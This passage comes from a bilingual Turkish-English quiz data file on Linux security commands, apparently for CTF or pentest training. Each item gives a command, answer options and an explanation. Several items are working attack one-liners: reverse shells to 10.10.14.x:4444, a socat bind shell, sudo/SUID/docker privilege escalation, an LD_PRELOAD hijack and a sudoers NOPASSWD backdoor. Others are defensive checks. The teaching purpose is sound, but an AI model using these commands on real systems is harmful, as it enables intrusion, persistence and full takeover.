        "tr": "StrictHostKeyChecking=no, 'Are you sure you want to continue connecting?' sorusunu atlayarak otomatik bağlantı kurar. Otomasyon ve saldırı script'lerinde terminalin kilitlenmesini engellemek için kullanılır.",
        "en": "StrictHostKeyChecking=no bypasses the manual interactive host verification prompt, essential in automated attack scripts."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "echo \"${PATH//:/\\n}\" | head -n 1",
      "options": [
        {
          "tr": "PATH ortam değişkeninin ilk arama dizinini (ör. /usr/local/sbin) verir",
          "en": "Outputs the first directory entry in the PATH environment variable"
        },
        {
          "tr": "PATH değişkenini siler",
          "en": "Deletes PATH variable"
        },
        {
          "tr": "Boş satır",
          "en": "Empty line"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "${PATH//:/\\n} Bash parametre genişletmesidir (parameter expansion); PATH içindeki tüm iki nokta (:) karakterlerini alt satıra (\\n) çevirir. head -n 1 ise ilk sıradaki dizini alır.",
        "en": "Bash substitution replaces ':' with newlines across $PATH, followed by head extracting the top search path."
      }
    },
    {
      "topic": "forensics",
      "code": "ls -lai /etc/passwd | awk '{print $1}'",
      "options": [
        {
          "tr": "/etc/passwd dosyasının inode (dosya düğümü) numarasını verir",
          "en": "Returns the inode number of /etc/passwd"
        },
        {
          "tr": "Dosyanın boyutunu verir",
          "en": "Outputs file size"
        },
        {
          "tr": "Dosyanın sahibini verir",
          "en": "Outputs file owner"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "ls komutuna -i (inode) parametresi verildiğinde ilk sütuna dosyanın dosya sistemindeki benzersiz indeks numarası (inode) yazılır. Adli bilişimde dosya kimliğini doğrulamak için kullanılır.",
        "en": "ls -i outputs the file's filesystem inode identifier in column 1, used in forensics to track underlying file identities."
      }
    }
  ],
  "expert": [
    {
      "topic": "privesc",
      "code": "find . -exec /bin/sh -p \\; -quit",
      "options": [
        {
          "tr": "Eğer 'find' ikili dosyasında SUID biti varsa, root ayrıcalıklarını koruyarak (-p) root kabuğu açar",
          "en": "If 'find' has SUID set, drops into an interactive root shell preserving privileges (-p)"
        },
        {
          "tr": "Tüm dizini siler",
          "en": "Deletes current directory"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Syntax error"
        },
        {
          "tr": "Dosya aramasını sonlandırır",
          "en": "Terminates file search"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Klasik bir GTFOBins tekniğidir. 'find' ikilisine SUID yetkisi verilmişse, -exec parametresi içinden çağrılan /bin/sh -p komutu root yetkilerini sıfırlamadan (Effective UID = root) tam bir root kabuğu teslim eder.",
        "en": "A textbook GTFOBins exploit. If 'find' is SUID, invoking /bin/sh -p retains root eUID, providing immediate privilege escalation."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1",
      "options": [
        {
          "tr": "Hedef makinede etkileşimli bir Bash kabuğu açıp stdin ve stdout/stderr'i 10.10.14.2:4444 soketine yönlendirir (Reverse Shell)",
          "en": "Spawns an interactive Bash reverse shell directing stdin/stdout/stderr to remote IP:port"
        },
        {
          "tr": "10.10.14.2 adresine DoS saldırısı yapar",
          "en": "Launches DoS attack against IP"
        },
        {
          "tr": "TCP paketlerini dinler",
          "en": "Sniffs TCP traffic"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "En popüler Linux Reverse Shell tek satırlığıdır. 'bash -i' etkileşimli kabuk açar. '>& /dev/tcp/...' standart çıktıyı (stdout: 1) ve hatayı (stderr: 2) uzak ağ soketine yönlendirir. '0>&1' ise standart girdiyi (stdin: 0) bu sokete bağlar.",
        "en": "The quintessential Linux reverse shell. bash -i connects stdout/stderr to remote socket, and 0>&1 binds stdin to that descriptor."
      }
    },
    {
      "topic": "privesc",
      "code": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
      "options": [
        {
          "tr": "Kullanıcıya sudoers dosyasında awk izni verilmişse, awk içinden doğrudan root kabuğu başlatır",
          "en": "Spawns a root shell via awk's internal system() call exploiting sudo privileges"
        },
        {
          "tr": "awk ile metin biçimlendirir",
          "en": "Formats text with awk"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "GTFOBins matrisinde awk komutu 'system()' fonksiyonu barındırır. Eğer bir kullanıcı şifresiz sudo ile awk çalıştırabiliyorsa, sistem() çağrısıyla root kabuğu alır ve sistem kontrolünü ele geçirir.",
        "en": "GTFOBins sudo bypass. awk's embedded system() function executes arbitrary subshells running with elevated root privileges."
      }
    },
    {
      "topic": "privesc",
      "code": "getcap -r / 2>/dev/null",
      "options": [
        {
          "tr": "Dosya sisteminde Linux Capabilities (yetenekler) atanmış ikili dosyaları arar",
          "en": "Enumerates all binaries configured with Linux Capabilities across filesystem"
        },
        {
          "tr": "Ağ paket yakalama kartlarını listeler",
          "en": "Lists network packet capture interfaces"
        },
        {
          "tr": "İşlemci önbellek boyutunu ölçer",
          "en": "Measures CPU cache"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Linux Capabilities, root yetkilerini parçalara böler. Örneğin python'a 'cap_setuid+ep' yeteneği verilmişse, python içinden 'os.setuid(0); os.system(\"/bin/sh\")' çalıştırılarak SUID biti olmasa bile anında root olunabilir!",
        "en": "Capabilities subdivide root powers. A binary with cap_setuid+ep (like python) can invoke setuid(0) directly for root escalation."
      }
    },
    {
      "topic": "forensics",
      "code": "head -n 1 /etc/shadow | cut -d: -f2 | cut -d$ -f2",
      "options": [
        {
          "tr": "root parolasının hangi hash algoritmasıyla şifrelendiğini gösteren kimlik numarası (ör. 6: SHA-512, y: yescrypt)",
          "en": "Identifies root password hash algorithm ID (e.g. 6: SHA-512, y: yescrypt)"
        },
        {
          "tr": "root parolasını düz metin olarak verir",
          "en": "Outputs root password in cleartext"
        },
        {
          "tr": "Kullanıcının son giriş tarihini verir",
          "en": "Outputs last login date"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "/etc/shadow formatında hash alanı $id$salt$hash şeklindedir. $1 = MD5, $5 = SHA-256, $6 = SHA-512, $y = Yescrypt. Siber güvenlik uzmanı hash'in tipini belirleyip hashcat/john ile kırma saldırısı başlatır.",
        "en": "In /etc/shadow, field 2 designates hash algorithm IDs: $1 (MD5), $6 (SHA-512), $y (Yescrypt), guiding tool selection for cracking."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f",
      "options": [
        {
          "tr": "Netcat -e parametresi kapalı olan sistemlerde Adlandırılmış Boru (FIFO) ile çift yönlü reverse shell açar",
          "en": "Establishes bidirectional reverse shell via Named Pipe (FIFO) on systems where nc -e is disabled"
        },
        {
          "tr": "Hedefte geçici dosya temizliği yapar",
          "en": "Performs temporary file cleanup"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws a syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Modern Linux dağıtımlarında netcat'in -e (execute) bayrağı güvenlik nedeniyle kaldırılmıştır (OpenBSD sürümü). mkfifo ile oluşturulan adlandırılmış boru (named pipe), veriyi döngüye sokarak tam işlevli bir kabuk sağlar.",
        "en": "When nc lacks the -e execution switch, creating a FIFO pipe (mkfifo) provides an elegant bidirectional reverse shell."
      }
    },
    {
      "topic": "security_recon",
      "code": "nmap -p- --min-rate 1000 -T4 10.10.10.30",
      "options": [
        {
          "tr": "Tüm 65535 TCP portunu saniyede en az 1000 paket göndererek yüksek hızda tarar",
          "en": "Scans all 65,535 TCP ports at high speed transmitting at least 1,000 packets per second"
        },
        {
          "tr": "Sadece ilk 1000 portu tarar",
          "en": "Scans only the first 1,000 ports"
        },
        {
          "tr": "Ağı çökertir",
          "en": "Crashes the network"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-p- '1-65535' arasındaki tüm portları kapsar. Standart Nmap sadece en popüler 1000 portu tarar. Yüksek portlara (ör. 8080, 27017, 44444) gizlenmiş servisleri yakalamak için CTF ve pentestlerde -p- esastır.",
        "en": "-p- scans the full 1-65535 port spectrum. Combined with --min-rate 1000, it rapidly exposes non-standard high ports."
      }
    },
    {
      "topic": "privesc",
      "code": "cat /etc/crontab | grep -v '^#' | awk '$6 == \"root\" {print $7}'",
      "options": [
        {
          "tr": "Sistem crontab'ında doğrudan root kullanıcısı tarafından periyodik olarak çalıştırılan script'leri listeler",
          "en": "Extracts script paths scheduled to run periodically under root in /etc/crontab"
        },
        {
          "tr": "Root kullanıcısını crontab'dan çıkarır",
          "en": "Removes root from crontab"
        },
        {
          "tr": "Cron servisini durdurur",
          "en": "Halts cron daemon"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Eğer root'un çalıştırdığı bu script'lerden birinin yazma izni (chmod 777) gevşek bırakılmışsa, saldırgan script'in içine reverse shell ekleyerek 1 dakika içinde root olur!",
        "en": "If any scheduled root script is world-writable, modifying it to execute a reverse shell guarantees automated root escalation."
      }
    },
    {
      "topic": "networking",
      "code": "iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT",
      "options": [
        {
          "tr": "Sadece 192.168.1.0/24 alt ağından gelen SSH (port 22) bağlantılarına izin veren güvenlik kuralı ekler",
          "en": "Appends firewall rule permitting SSH (port 22) connections exclusively from 192.168.1.0/24 subnet"
        },
        {
          "tr": "SSH portunu herkese açar",
          "en": "Opens SSH to everyone"
        },
        {
          "tr": "22 numaralı portu kapatır",
          "en": "Shuts down port 22"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "-A (Append/Ekle), INPUT zincirine kural ekler. -p tcp protokol, --dport hedef port, -s kaynak IP/alt ağ, -j ACCEPT (Kabul Et). Sunucu sıkılaştırma (hardening) için SSH'ı sadece yönetim ağına kısıtlamak temel kuraldır.",
        "en": "Appends an INPUT rule allowing SSH ingress restricted to the management subnet, a core hardening best practice."
      }
    },
    {
      "topic": "privesc",
      "code": "sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find",
      "options": [
        {
          "tr": "Sudoers dosyasında 'env_keep += LD_PRELOAD' varsa, find çalışmadan önce kötücül kütüphaneyi yükleyip root olur",
          "en": "Exploits LD_PRELOAD via sudo if env_keep is enabled to hijack execution flow and spawn root"
        },
        {
          "tr": "find komutunu hızlandırır",
          "en": "Accelerates find command"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "LD_PRELOAD ortam değişkeni, dinamik bağlayıcıya (dynamic linker) belirtilen paylaşımlı kütüphaneyi (.so) programdan önce yükletir. evil.so içindeki init fonksiyonuna /bin/sh konulduğunda sudo ile anında root kabuğu tetiklenir.",
        "en": "LD_PRELOAD forces the dynamic linker to load custom shared objects before standard libraries, hijacking execution under sudo."
      }
    },
    {
      "topic": "forensics",
      "code": "find / -type f -name \".*\" -exec ls -la {} + 2>/dev/null | grep -E \"/\\.[a-zA-Z0-9]+\"",
      "options": [
        {
          "tr": "Dosya sisteminde gizlenmiş şüpheli nokta dosyalarını (.hidden) derinlemesine denetler",
          "en": "Audits deeply nested suspicious hidden dot files across the filesystem"
        },
        {
          "tr": "Tüm gizli dosyaları siler",
          "en": "Deletes hidden files"
        },
        {
          "tr": "Disk kullanımını optimize eder",
          "en": "Optimizes disk usage"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Saldırganlar ve rootkit'ler payload ve konfigürasyonlarını gizlemek için '.rootkit' veya '... ' gibi nokta ile başlayan gizli isimler kullanır. Adli bilişimde tüm gizli dosyalar taranır.",
        "en": "Attackers rely on hidden dot files (e.g. .backdoor) to obscure presence. Sweeping hidden files is standard forensic triage."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "options": [
        {
          "tr": "Ham veya kısıtlı bir ters kabuğu (reverse shell) tam etkileşimli TTY/PTY kabuğuna yükseltir",
          "en": "Upgrades a raw dumb reverse shell into a fully interactive TTY/PTY terminal"
        },
        {
          "tr": "Python sürümünü test eder",
          "en": "Tests Python version"
        },
        {
          "tr": "Hedef sistemi yeniden başlatır",
          "en": "Reboots target system"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Netcat ile elde edilen ilk kabuklar genelde 'dumb shell'dir (ok tuşları çalışmaz, nano/su açılamaz, Ctrl+C bağlantıyı koparır). Python pty modülü sanal uçbirim oluşturarak kabuğu stabil hale getirir.",
        "en": "Raw reverse shells lack TTY features (no job control, broken arrows). Spawning via pty stabilizes the terminal."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
      "options": [
        {
          "tr": "Socat ile tam etkileşimli, TTY destekli ve şifreli olabilen gelişmiş bir bind shell dinleyicisi açar",
          "en": "Deploys a robust, fully interactive TTY-supported bind shell listener via socat"
        },
        {
          "tr": "Portu kapatır",
          "en": "Closes port"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "socat, netcat'in çok daha güçlü bir alternatifidir. pty, stderr ve setsid parametreleri sayesinde doğrudan mükemmel bir tam ekran terminal (Ctrl+C ve ok tuşları dahil) sunar.",
        "en": "socat establishes full-featured pseudo-terminals overcoming dumb shell limitations seamlessly."
      }
    },
    {
      "topic": "security_recon",
      "code": "nikto -h 10.10.10.50 -p 80,443 -C all",
      "options": [
        {
          "tr": "Hedef web sunucusunu bilinen 6700+ güvenlik açığına, varsayılan dosyalara ve tehlikeli CGI betiklerine karşı tarar",
          "en": "Scans target web server for 6700+ known vulnerabilities, dangerous files, and outdated server components"
        },
        {
          "tr": "Web sunucusuna dosya yükler",
          "en": "Uploads files to web server"
        },
        {
          "tr": "Web sunucusunun veri tabanını siler",
          "en": "Deletes web server database"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Nikto, web sunucularında yanlış yapılandırmaları, varsayılan yüklemeleri ve bilinen eski zafiyetli bileşenleri hızlıca tespit eden popüler bir güvenlik tarama aracıdır.",
        "en": "Nikto scans web servers for dangerous files, outdated server software, and critical misconfigurations."
      }
    },
    {
      "topic": "privesc",
      "code": "strace -f -p $(pgrep -u root vulnerable_service) 2>&1 | grep -i \"open\"",
      "options": [
        {
          "tr": "Root tarafından çalışan servisin arka planda açmaya çalıştığı dosya yollarını (paylaşımlı kütüphaneler vb.) canlı izler",
          "en": "Live-monitors system calls tracing file open attempts by a root process to spot hijackable library paths"
        },
        {
          "tr": "Servisi hemen sonlandırır",
          "en": "Kills process immediately"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "strace sistem çağrılarını yakalar. Servis bulunamayan bir paylaşımlı kütüphaneyi (/tmp/lib.so vb.) açmaya çalışıyorsa (ENOENT), saldırgan bu dosyayı oluşturup servisin onu çalıştırmasını sağlayarak yetki yükseltir (Shared Object Hijacking).",
        "en": "strace monitors system calls. Spotting failed library load attempts (ENOENT) exposes Shared Object Injection vulnerabilities."
      }
    },
    {
      "topic": "forensics",
      "code": "grep -rnw '/var/www/html/' -e 'eval(' -e 'base64_decode('",
      "options": [
        {
          "tr": "Web dizininde gizlenmiş olası PHP Web Shell (arka kapı) kodlarını hızlıca tespit eder",
          "en": "Scans web root to uncover obfuscated PHP Web Shells utilizing dangerous eval/base64 calls"
        },
        {
          "tr": "Tüm web sitesini derler",
          "en": "Compiles the web application"
        },
        {
          "tr": "Web sayfalarını önbelleğe alır",
          "en": "Caches web pages"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Web shell'ler (ör. c99, r57, Weevely) tespit edilmemek için genelde zararlı kodlarını 'eval(base64_decode(...))' ile gizler. Bu grep kalıbı olay müdahalesinde (incident response) ilk çalıştırılan filtredir.",
        "en": "Web shells heavily rely on eval(base64_decode()) to evade detection. Sweeping for these keywords rapidly flags backdoors."
      }
    },
    {
      "topic": "privesc",
      "code": "docker run -v /:/host -it ubuntu chroot /host",
      "options": [
        {
          "tr": "Docker grubundaki kullanıcı, ana makinenin kök dizinini konteynere bağlayıp chroot ile ana makinede root olur",
          "en": "Escalates from docker group to root host by mounting host root filesystem into container and chrooting"
        },
        {
          "tr": "Docker'ı sistemden kaldırır",
          "en": "Uninstalls Docker"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Docker grubundaki bir kullanıcı ana makinede neredeyse root'tur. -v /:/host ile tüm fiziksel disk konteynere bağlanır, konteyner içinde 'chroot /host' yapıldığında doğrudan ana işletim sisteminin root kabuğuna çıkılır!",
        "en": "Being in the docker group is equivalent to root. Mounting / allows trivial escape and complete host root compromise."
      }
    },
    {
      "topic": "bash_scripting",
      "code": "cat << 'EOF' > /tmp/check.sh\n#!/bin/bash\n[ $UID -eq 0 ] && echo \"ROOT\" || echo \"USER\"\nEOF\nbash /tmp/check.sh",
      "options": [
        {
          "tr": "Mevcut kullanıcı root ise 'ROOT', normal kullanıcı ise 'USER' yazar",
          "en": "Outputs 'ROOT' if executed as root (UID 0), otherwise 'USER'"
        },
        {
          "tr": "ROOT",
          "en": "ROOT"
        },
        {
          "tr": "USER",
          "en": "USER"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "$UID ortam değişkeni oturumdaki kullanıcının sayısal ID'sidir. 0 sadece root'a aittir. [ $UID -eq 0 ] karşılaştırması betiğin yetkili çalışıp çalışmadığını test eder.",
        "en": "$UID is 0 exclusively for root. [ $UID -eq 0 ] tests superuser authority dynamically."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "ssh-keygen -t ed25519 -C 'pentest_key' -N '' -f ~/.ssh/id_ed25519",
      "options": [
        {
          "tr": "Parolasız (-N ''), modern ve son derece güvenli Ed25519 SSH anahtar çifti oluşturur",
          "en": "Generates an unpassphrased (-N '') modern Ed25519 SSH keypair non-interactively"
        },
        {
          "tr": "SSH sunucusunu yeniden başlatır",
          "en": "Restarts SSH daemon"
        },
        {
          "tr": "Eski anahtarları siler",
          "en": "Deletes old keys"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Ed25519, eski RSA anahtarlarına kıyasla daha kısa, daha hızlı ve kuantum öncesi kriptografik olarak çok daha güvenlidir. -N '' anahtara parola koymaz, böylece arka plandaki otomasyonlarda parola sormaz.",
        "en": "Ed25519 provides superior cryptographic security and speed. -N '' leaves passphrase blank for automated key logins."
      }
    },
    {
      "topic": "privesc",
      "code": "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
      "options": [
        {
          "tr": "Sistemdeki tüm kullanıcılara şifresiz sınırsız tam root yetkisi verir (kalıcı arka kapı)",
          "en": "Grants all system users unrestricted passwordless sudo root privileges (persistence backdoor)"
        },
        {
          "tr": "Sudo yetkilerini kısıtlar",
          "en": "Restricts sudo privileges"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Saldırgan root olduktan sonra kalıcılık (persistence) sağlamak için /etc/sudoers dosyasına bu satırı eklerse, sistemdeki herhangi bir düşük yetkili kullanıcı bile doğrudan 'sudo su' ile root olabilir.",
        "en": "Appending this rule to /etc/sudoers is a devastating persistence technique allowing any account instant passwordless root access."
      }
    },
    {
      "topic": "forensics",
      "code": "find / -ctime -1 -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -n 5",
      "options": [
        {
          "tr": "Son 24 saat içinde izin veya durum değişikliğine (ctime) uğramış ilk 5 dosyayı listeler",
          "en": "Lists the first 5 regular files whose status or permissions changed in the last 24 hours"
        },
        {
          "tr": "Son 1 dakikada silinen dosyaları kurtarır",
          "en": "Recovers files deleted in last minute"
        },
        {
          "tr": "Dosyaları zaman damgasına göre siler",
          "en": "Deletes files based on timestamp"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "atime (erişim), mtime (içerik değişikliği), ctime (metadata / izin değişikliği). -ctime -1 son 24 saatte chmod/chown yapılmış veya yeni yüklenmiş dosyaları adli bilişim için raporlar.",
        "en": "-ctime tracks permission or inode modifications. Spotting files altered in the last day identifies recent attacker activity."
      }
    },
    {
      "topic": "networking",
      "code": "masscan 10.10.10.0/24 -p 80,443 --rate 10000",
      "options": [
        {
          "tr": "Tüm C sınıfı alt ağı (256 IP) saniyede 10.000 paket hızında SYN taramasıyla asenkron tarar",
          "en": "Asynchronously scans the entire /24 subnet for ports 80 and 443 at 10,000 packets per second"
        },
        {
          "tr": "Tüm web sitelerini klonlar",
          "en": "Clones all websites"
        },
        {
          "tr": "Ağ yönlendiricisini yeniden başlatır",
          "en": "Reboots network router"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Masscan, dünyanın en hızlı port tarayıcısıdır. Kendi özel TCP yığınını (custom TCP stack) kullanarak interneti veya geniş alt ağları dakikalar içinde tarayabilir.",
        "en": "Masscan utilizes its own custom raw TCP stack to achieve extreme scanning speeds over broad subnets."
      }
    },
    {
      "topic": "privesc",
      "code": "export PATH=/tmp:$PATH",
      "options": [
        {
          "tr": "/tmp dizinini komut arama yolunun en başına ekler (PATH Hijacking için temel zemin)",
          "en": "Prepends /tmp to the search path, laying the foundation for PATH Hijacking attacks"
        },
        {
          "tr": "PATH değişkenini sıfırlar",
          "en": "Resets PATH variable"
        },
        {
          "tr": "Sözdizimi hatası verir",
          "en": "Throws syntax error"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "Eğer bir SUID programı veya cron job mutlak yol vermeden 'service apache2 restart' gibi bir komut çağırıyorsa, saldırgan /tmp altına 'service' adında zararlı bir script koyar. PATH'in başında /tmp olduğu için sistem önce saldırganın kodunu root olarak çalıştırır!",
        "en": "Prepending /tmp enables PATH Hijacking. If any privileged script invokes a command without an absolute path, the malicious binary in /tmp executes first."
      }
    },
    {
      "topic": "crypto_tunnel",
      "code": "openssl enc -aes-256-cbc -salt -pbkdf2 -in flag.txt -out flag.enc",
      "options": [
        {
          "tr": "flag.txt dosyasını PBKDF2 ve salt kullanarak güçlü AES-256-CBC algoritmasıyla şifreler",
          "en": "Encrypts flag.txt with robust AES-256-CBC using PBKDF2 key derivation and random salt"
        },
        {
          "tr": "Dosyayı düz metin olarak açar",
          "en": "Opens file in plain text"
        },
        {
          "tr": "Dosyayı base64'e dönüştürür",
          "en": "Converts file to base64"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "OpenSSL ile simetrik şifreleme. -pbkdf2 anahtar türetme fonksiyonu ile brute-force saldırılarına karşı güvenliği artırır, -salt ise aynı parolayla farklı şifreli metinler üretilmesini sağlar.",
        "en": "OpenSSL AES-256-CBC symmetric encryption. -pbkdf2 hardens against brute-force, while -salt randomizes identical plaintexts."
      }
    },
    {
      "topic": "security_recon",
      "code": "dnsrecon -d target.com -t std",
      "options": [
        {
          "tr": "target.com için standart DNS kayıtlarını (SOA, NS, A, AAAA, MX, TXT) ve bölge transferi (AXFR) açığını kontrol eder",
          "en": "Performs standard DNS enumeration (SOA, NS, A, MX, TXT) and checks for Zone Transfer (AXFR) vulnerabilities"
        },
        {
          "tr": "DNS sunucusunu kapatır",
          "en": "Shuts down DNS server"
        },
        {
          "tr": "Alan adını kaydeder",
          "en": "Registers domain"
        },
        {
          "tr": "Sözdizimi / Komut hatası verir",
          "en": "Syntax / Command error"
        }
      ],
      "answer": 0,
      "explanation": {
        "tr": "DNS keşfinde 'Zone Transfer' (AXFR) zafiyeti varsa, hedef kuruluşun tüm alt alan adları ve iç ağ IP haritası tek komutla dışarı sızar. dnsrecon bu denetimi otomatikleştirir.",
        "en": "dnsrecon automates DNS footprinting and tests for Zone Transfer misconfigurations that expose internal network topologies."
      }
    }
  ]
};
